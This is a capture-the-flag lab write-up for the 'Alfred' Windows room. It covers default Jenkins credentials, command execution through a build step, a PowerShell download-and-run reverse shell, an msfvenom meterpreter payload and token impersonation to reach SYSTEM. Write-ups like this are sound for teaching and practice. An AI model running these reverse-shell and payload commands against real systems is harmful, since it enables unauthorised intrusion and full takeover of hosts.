# Alfred

##### Difficulty: [ Easy ]

**Tags:** `Windows`,  `nmap`,  `Jenkins`,  `Powershell`,  `Reverse shell`,  `msfvenom`,  `meterpreter`,  `token impersonation`

---

##### Written: 26/09/2021

##### IP Address: 10.10.113.167

---

Let's start off with a basic **nmap** scan on the target machine. The room states that the machine does not respond to ping (ICMP). Hence, we have to specify the **-Pn** tag in our nmap command. This will disable host discovery, basically skipping the process of pinging the target machine to see if it is alive.

```
sudo nmap -sC -sV -Pn -vv 10.10.113.167
```

**Results:**

<img style="float: left;" src="screenshots/screenshot1.png">

From the results, we can see that there are **3** ports currently open on our target machine:

* Port **80**: HTTP
* Port **3389**
* Port **8080**: HTTP

<br>

Let's first visit the web server on port 80. Navigating to the address, we are brought to the following page:

<img style="float: left;" src="screenshots/screenshot2.png">

After looking through the website and running a **Gobuster** scan, I was unable to find anything of interest. Let's move on to the web server on port 8080.

<img style="float: left;" src="screenshots/screenshot3.png">

Nice! We found a login page to a **Jenkins server**. 

*Jenkins is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery (from Wikipedia).*

<br>

Let's go ahead and try using a common default username and password, **admin:admin**.

<img style="float: left;" src="screenshots/screenshot4.png">

Luckily for us, those credentials actually worked. We are able to log into the Jenkins dashboard.

The room then asks us to find a feature of the Jenkins tool that allows us to execute commands on the underlying system. After digging around, I managed to find a configuration page which allows us to input commands that will be executed server-side. To access this page, we click on the current project named **'project'**, then **'Configure'** on the left-hand side, then move down to the **'Build'** section.

<img style="float: left;" src="screenshots/screenshot5.png">

In this field, we are able to input shell commands which will be executed once the project is built. Let's test this out so that we can  better understand how it works. We'll leave the command to be ```whoami```.

<img style="float: left;" src="screenshots/screenshot6.png">

Now, we simply click on **'Build Now'** on the project page, then click on the corresponding build in the **'Build History'** section, then click on the **'Console Output'** to see the results of our command.

<img style="float: left;" src="screenshots/screenshot7.png">

It works! This proves that we can run arbitrary commands on the server. Thus, we can use this to upload a reverse shell script that will grant us initial access into our target machine. Since this is a **Windows** machine, we will be using a Powershell reverse shell script that is part of the **Nishang** framework (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

<br>

After downloading the reverse shell script onto our local machine, we then run a Python HTTP server so that we can download the script onto our target.

Next, we input the following command into the **'Build'** section of the project:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

The first part of this command will download the reverse shell script onto the target machine. It will then run the script using ```Invoke-PowerShellTcp```.

<img style="float: left;" src="screenshots/screenshot8.png">

Finally, we make sure to have a **netcat** listener up and ready to catch the connection.

<br>

With everything set up, let's go ahead and build the project!

<img style="float: left;" src="screenshots/screenshot9.png">

And we're in :smile:

<img style="float: left;" src="screenshots/screenshot10.png">

**We can find the user flag from user.txt located in the Desktop of the user Bruce.**

---

To make the privilege escalation process easier, let's switch to a **Meterpreter shell** using **Metasploit**.

Firstly, we need to create a Windows-based reverse shell executable which can connect back to our Meterpreter listener. This can be done using **Msfvenom**.

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 -e x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o shell.exe
```

<img style="float: left;" src="screenshots/screenshot11.png">

<br>

With our payload created, we can upload it onto the target machine using the same command method as before.

``` 
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell.exe','shell.exe')"
```

<img style="float: left;" src="screenshots/screenshot12.png">

For good measure, I'll also add in a ```dir``` command to list out the contents of the server directory. This is to confirm that our payload has been successfully uploaded onto the target machine.

<br> 

<img style="float: left;" src="screenshots/screenshot13.png">

After building the project, we can see from the console output that our malicious payload (shell.exe) has been successfully uploaded on the target machine.

Now, we just have to execute it using:

```
.\shell.exe
```

<img style="float: left;" src="screenshots/screenshot14.png">

<br>

Before building, we need to have the appropriate handler up and running in Metasploit. We will be using the **/multi/handler** module.

```
use /multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST x.x.x.x 
set LPORT 4444
run -j
```

With the TCP listener up and running in Metasploit, we can go ahead and build the project.

<img style="float: left;" src="screenshots/screenshot15.png">

We have successfully spawned a Meterpreter shell!

---

Now that we have initial access via a Meterpreter shell, we can use **token impersonation** to gain system access.

*More information about Tokens can be found in the room description.*

<br>

Let's first spawn a shell that we can use. This can be done using the ```shell``` command in Meterpreter.

Next, we use the ```whoami /priv``` command to view all privileges on this account. The results are as follows:

<img style="float: left;" src="screenshots/screenshot16.png">

As we can see, the **SeDebugPrivilege** and **SeImpersonatePrivilege** privileges have been enabled. We can exploit this vulnerability by using the **incognito** module in Metasploit. To load this, we first exit out of the shell. Then we use the command ```load incognito```. 

<img style="float: left;" src="screenshots/screenshot17.png">

<img style="float: left;" src="screenshots/screenshot18.png">

Loading this module gives us more commands that we can run on our target machine. We will be using the ```list_tokens``` command.

```
list_tokens -g
```

*The -g tag lists tokens by unique groupname*

**Results:**

<img style="float: left;" src="screenshots/screenshot19.png">

From the results, we can see that the **BUILTIN\Administrators** delegation token is available. We can then use the ```impersonate_token``` command to impersonate the root user.

```
impersonate_token "BUILTIN\Administrators"
```

**Results:**

<img style="float: left;" src="screenshots/screenshot20.png">

With that, we have successfully impersonated the **root user (NT AUTHORITY\SYSTEM)**.

<br>

However, even though we have a higher privileged token, we may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 

Hence, we need to make sure that we migrate to a process with the correct **NT AUTHORITY\SYSTEM** permissions. 

According to the room, the safest process to migrate to is the **services.exe** process. Let's migrate to that process now.

Before doing so, we need to find the **PID** of the process. We can use the ```ps``` command.

<img style="float: left;" src="screenshots/screenshot21.png">

The PID of services.exe is **668**. 

<br>

Now we can migrate to the process using the following command:

```
migrate 668
```

<img style="float: left;" src="screenshots/screenshot22.png">

After the migration is complete, we can spawn a higher-privileged shell using the ```shell``` command again. We can then read the **root.txt** file located in **C:\Windows\System32\config** using the ```TYPE``` command.

<img style="float: left;" src="screenshots/screenshot23.png">

**With that, we can obtain the root flag and complete the room.**

